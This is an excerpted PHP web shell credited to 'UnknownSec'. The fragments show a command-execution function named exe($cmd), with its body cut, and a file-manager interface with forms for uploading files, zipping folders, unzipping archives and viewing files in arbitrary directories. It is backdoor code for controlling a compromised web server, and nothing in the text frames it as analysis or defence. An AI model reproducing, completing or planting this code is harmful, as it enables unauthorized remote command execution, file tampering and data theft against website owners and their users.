...
function tpfile($file) {
	if (function_exists('finfo_open')) {
		$fi = finfo_open(FILEINFO_MIME_TYPE);
		$mtype = finfo_file($fi, $file);
		finfo_close($fi);
	} else {
		$mtype = mime_content_type($file);
	}
	if (empty($mtype)) $mtype = 'application/octet-stream';
		return $mtype;
}
function exe($cmd) {
...
<html>
	<head>
		<meta charset='UTF-8'>
		<meta name='theme-color' content='#384047'>
		<meta name='copyright' content='UnknownSec'>
		<meta name='author' content='UnknownSec'>
...
<div class='container'>
	...
	<form action='?dir=$path&id=zip' enctype='multipart/form-data' method='POST'>
		<div class='input-group mb-3'>
			...
			<input type='submit' name='upnun' class='btn btn-dark btn-sm' value='Submit'>
		</div>
	</form>";
	if($nana["upnun"]){
...
<form action='?dir=$path&id=zip' method='POST'>
	...
	<div class='input-group mb-3'>
		...
		<input type='submit' name='backup' class='btn btn-dark btn-sm' value='Submit'>
	</div>
</form>";
	if($nana['backup']){
		$fol = $nana['folder'];
...
<b>Unzip manual</b>
	<form action='?dir=$path&id=zip' method='POST'>
		<label>location:</label>
			...
			<input type='submit' name='extrak' class='btn btn-dark btn-sm' value='Submit'>
		</div>
	</form>
	</div>
</div>
...
<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' onclick='c(\"?dir=$path&action=view&opn=$file\")'>$_f</a></td>
	<td class='text-center'>".tpfile($file)."</td>
